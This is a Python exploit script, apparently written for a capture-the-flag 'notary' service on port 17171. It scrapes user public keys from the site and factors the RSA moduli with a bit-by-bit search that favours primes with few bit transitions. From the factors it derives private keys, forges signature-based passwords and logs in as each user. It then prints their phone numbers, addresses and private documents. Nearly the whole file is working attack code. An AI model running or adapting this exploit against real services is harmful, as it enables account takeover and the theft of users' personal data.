#!/usr/bin/env python3

import re
import sys
import math
import gmpy
import bisect
import requests

import notary


def count_splits(bits, n):
    s = bin(n)[2:].zfill(bits)
    count = 0
    previous = s[0]
    for i in range(1, len(s)):
        if s[i] != previous:
            count += 1
            previous = s[i]
    return count


def find_next_solutions(k, n, previous_solutions):
    solutions = []
    visited = set()

    mod = 1 << k
    n_part = n % mod

    for _, p, q in previous_solutions:
        p2 = p + mod
        q2 = q + mod
        n1 = (p * q) % mod
        n2 = (p2 * q) % mod
        n3 = (p * q2) % mod
        n4 = (p2 * q2) % mod

        for _p, _q, _n in [(p, q, n1), (p, q2, n2), (p2, q, n3), (p2, q2, n4)]:
            if _n == n_part and (_p, _q) not in visited:
                weight = count_splits(k, _p) + count_splits(k, _q)  
                bisect.insort(solutions, ((weight, _p, _q)))
                visited.add((_p, _q))
                visited.add((_q, _p))

    return solutions


def factorize_limited(bits, n, limit):
    solutions = [(2, 1, 1)]

    for k in range(1, bits - 1):
        solutions = find_next_solutions(k, n, solutions)[:limit]

    for _, p, q in solutions:
        p2 = p + (1 << (bits - 1))
        q2 = q + (1 << (bits - 1))

        if n % p2 == 0:
            return p2, n // p2
        if n % q2 == 0:
            return q2, n // q2


def factorize(n, start_limit=10):
    bits = math.ceil(math.log2(n)) // 2
    limit = start_limit

    while True:
        factor = factorize_limited(bits, n, limit)
        if factor is not None:
            return factor
        limit *= 2


def recover_private_key(N, e):
    p, q = factorize(N)
    phi = (p + 1) * (q + 1)
    d = int(gmpy.invert(e, phi))
    return N, p, q, e, d


def recover_user_credentials(url, user_url):
    html = requests.get(url + user_url).text
    
    username = re.search(r'<h2>(.*?)\'s profile</h2>', html).group(1)

    public_key = re.search(r'<strong>Public key</strong>: <code>(.*?)</code>', html).group(1)    
    N, e = notary.load_numbers(notary.deserialize_bytes(public_key))

    N, p, q, e, d = recover_private_key(N, e)
    private_key = notary.pack_numbers(N, p, q, e, d)

    password = notary.create_sign(private_key, username.encode('utf-8'))

    return username, notary.serialize_bytes(password)


def main():
    IP = sys.argv[1] if len(sys.argv) > 1 else '0.0.0.0'
    PORT = 17171

    url = f'http://{IP}:{PORT}'

    html = requests.get(url).text
    data_urls = re.findall(r'<a href="(/doc/.*?)">.*?<p>(.*?)</p>.*?Signed by <a href="(/user/.*?)">', html, re.DOTALL)

    for document_url, text, user_url in data_urls:
        username, password = recover_user_credentials(url, user_url)

        session = requests.session()
        
        html = session.get(url + '/login').text
        csrf_token = re.search(r'<input id="csrf_token" name="csrf_token" type="hidden" value="(.*?)">', html).group(1)

        profile = session.post(url + '/login', data={'csrf_token': csrf_token, 'username': username, 'password': password}).text
        
        phone = re.search(r'<div> <strong>Phone</strong>:(.*?)</div>', profile).group(1)
        address = re.search(r'<div> <strong>Address</strong>:(.*?)</div>', profile).group(1)

        print(username, phone, address)

        if 'Private document' in text:
            html = session.get(url + document_url).text
            content = re.search(r'<p>(.*?)</p>', html).group(1)
            
            print(document_url, content)


if __name__ == '__main__':
    main()
